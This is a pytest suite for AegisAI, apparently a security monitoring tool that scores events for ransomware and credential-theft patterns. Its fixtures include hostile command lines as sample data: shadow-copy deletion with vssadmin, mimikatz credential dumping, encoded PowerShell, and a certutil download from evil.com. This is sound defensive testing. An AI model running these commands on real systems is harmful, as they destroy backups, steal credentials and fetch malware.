"""Automated test suite for AegisAI.

Verifies data contracts, rules heuristics, anomaly detection, hybrid scoring,
LLM triage validation, and simulated remediation guardrails.
"""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from src.anomaly import AnomalyDetector
from src.data_generator import generate_attack_scenario, generate_baseline_events
from src.models import Event, TriageResult
from src.remediate import log_mitigation
from src.rules import rule_score
from src.scorer import RiskScorer
from src.triage import _deterministic_fallback_triage, explain_incident


def test_event_validation_success():
    """Verify that a valid Event schema parses correctly."""
    event = Event(
        user="test.analyst",
        files_touched_per_min=25,
        new_country=False,
        process_chain="explorer.exe -> chrome.exe",
        cpu_percent=14.5,
    )
    assert event.user == "test.analyst"
    assert event.files_touched_per_min == 25
    assert not event.new_country


def test_event_validation_rejection():
    """Verify that invalid Event inputs fail validation."""
    with pytest.raises(ValidationError):
        Event(
            user="",  # empty user
            files_touched_per_min=-5,  # negative files
            new_country=False,
            process_chain="   ",  # whitespace only
            cpu_percent=150.0,  # cpu > 100
        )


def test_triage_result_validation():
    """Verify TriageResult severity literal and schema constraints."""
    result = TriageResult(
        threat_type="Ransomware",
        severity="critical",
        plain_summary="Mass file encryption observed in active session.",
        mitigation_command="taskkill /F /IM encrypter.exe",
    )
    assert result.severity == "critical"

    with pytest.raises(ValidationError):
        TriageResult(
            threat_type="X",
            severity="extreme",  # Invalid severity literal
            plain_summary="short",
            mitigation_command="cmd",
        )


def test_rules_engine_benign_vs_attack():
    """Verify rules engine gives 0 to benign events and high scores to attacks."""
    benign_event = Event(
        user="alice",
        files_touched_per_min=5,
        new_country=False,
        process_chain="explorer.exe -> code.exe",
        cpu_percent=10.0,
    )
    assert rule_score(benign_event) == 0

    attack_event = Event(
        user="victim",
        files_touched_per_min=450,
        new_country=True,
        process_chain="winword.exe -> cmd.exe -> powershell.exe -enc V1ND",
        cpu_percent=92.0,
    )
    score = rule_score(attack_event)
    # Rules: files>=300 (40) + country (35) + office->cmd (35) + ps -enc (35) + cpu>=85 (15) = 160
    assert score >= 100


def test_anomaly_detector():
    """Verify Isolation Forest scores benign baseline low and deviations high."""
    baseline = generate_baseline_events(100)
    detector = AnomalyDetector()
    detector.fit(baseline)

    benign_sample = baseline[0]
    outlier_sample = Event(
        user="unknown",
        files_touched_per_min=1500,
        new_country=True,
        process_chain="cmd.exe -> vssadmin.exe delete shadows /all /quiet",
        cpu_percent=98.0,
    )

    benign_s = detector.anomaly_score(benign_sample)
    outlier_s = detector.anomaly_score(outlier_sample)

    assert benign_s < outlier_s
    assert outlier_s >= 40


def test_hybrid_risk_scorer():
    """Verify stateful cumulative scoring and incident threshold gating."""
    scorer = RiskScorer(threshold=75)
    scenario_events = generate_attack_scenario("ransomware", user="target_user")

    breakdowns = [scorer.score_event(e) for e in scenario_events]
    assert any(b.is_breached for b in breakdowns)
    assert scorer.get_user_score("target_user") >= 75

    scorer.reset_user("target_user")
    assert scorer.get_user_score("target_user") == 0


def test_remediation_simulation_guarantee():
    """Verify mitigation logger enforces simulation mode without shell execution."""
    triage = TriageResult(
        threat_type="Credential Theft",
        severity="high",
        plain_summary="Credential harvesting detected via LSASS read.",
        mitigation_command="taskkill /F /IM mimikatz.exe",
    )

    audit = log_mitigation(triage, user="alice.ops")
    assert audit["status"] == "SIMULATED"
    assert audit["executed_live"] is False
    assert "SIMULATION ONLY" in audit["notice"]
    assert audit["mitigation_command"] == "taskkill /F /IM mimikatz.exe"


def test_temporal_burst_bonus():
    """Verify that 3+ events scoring > 30 within sliding window trigger +20 burst bonus."""
    from datetime import datetime, timedelta, timezone

    scorer = RiskScorer(
        threshold=100,
        burst_window_seconds=300,
        burst_threshold_score=30,
        burst_min_events=3,
        burst_bonus=20,
    )
    base_t = datetime.now(timezone.utc)

    # Event 1: scoring > 30
    e1 = Event(
        user="burst_victim",
        files_touched_per_min=10,
        new_country=True,  # rule_score = 35
        process_chain="explorer.exe -> chrome.exe",
        cpu_percent=10.0,
        timestamp=base_t,
    )
    b1 = scorer.score_event(e1)
    assert b1.burst_bonus == 0
    assert b1.rule_score == 35

    # Event 2: 1 minute later, scoring > 30
    e2 = Event(
        user="burst_victim",
        files_touched_per_min=10,
        new_country=True,  # rule_score = 35
        process_chain="explorer.exe -> chrome.exe",
        cpu_percent=10.0,
        timestamp=base_t + timedelta(minutes=1),
    )
    b2 = scorer.score_event(e2)
    assert b2.burst_bonus == 0

    # Event 3: 2 minutes later (within 5 min window), scoring > 30 -> triggers burst bonus +20
    e3 = Event(
        user="burst_victim",
        files_touched_per_min=10,
        new_country=True,  # rule_score = 35
        process_chain="explorer.exe -> chrome.exe",
        cpu_percent=10.0,
        timestamp=base_t + timedelta(minutes=2),
    )
    b3 = scorer.score_event(e3)
    assert b3.burst_bonus == 20
    # Cumulative score includes b1, b2, b3 raw scores + b3 burst bonus
    assert b3.cumulative_score == b1.combined_score + b2.combined_score + b3.combined_score + 20

    # Reset user clears burst history
    scorer.reset_user("burst_victim")
    assert scorer.get_user_score("burst_victim") == 0


def test_deterministic_fallback_triage():
    """Verify deterministic fallback triage returns valid TriageResult across threat types."""
    # Ransomware event
    ransom_event = Event(
        user="victim.ransom",
        files_touched_per_min=500,
        new_country=False,
        process_chain="vssadmin.exe delete shadows /all /quiet",
        cpu_percent=90.0,
    )
    res = _deterministic_fallback_triage(ransom_event, score=140)
    assert isinstance(res, TriageResult)
    assert res.threat_type == "Ransomware Encryption Activity"
    assert res.severity == "critical"
    assert "shadow copy" in res.plain_summary
    assert "taskkill" in res.mitigation_command

    # Credential dumping event
    cred_event = Event(
        user="victim.cred",
        files_touched_per_min=10,
        new_country=True,
        process_chain="powershell.exe -> mimikatz.exe sekurlsa::logonpasswords",
        cpu_percent=30.0,
    )
    res_cred = _deterministic_fallback_triage(cred_event, score=120)
    assert isinstance(res_cred, TriageResult)
    assert res_cred.threat_type == "Credential Dumping Attack"
    assert res_cred.severity == "critical"


def test_explain_incident_returns_valid_triage_result():
    """Verify explain_incident returns a valid TriageResult (live or fallback)."""
    event = Event(
        user="victim.test",
        files_touched_per_min=350,
        new_country=False,
        process_chain="winword.exe -> cmd.exe -> certutil.exe -urlcache -split -f http://evil.com/p.exe",
        cpu_percent=75.0,
    )
    triage = explain_incident(event, score=110)
    assert isinstance(triage, TriageResult)
    assert triage.severity in ("low", "medium", "high", "critical")
    assert len(triage.threat_type) > 0
    assert len(triage.plain_summary) > 0
    assert len(triage.mitigation_command) > 0


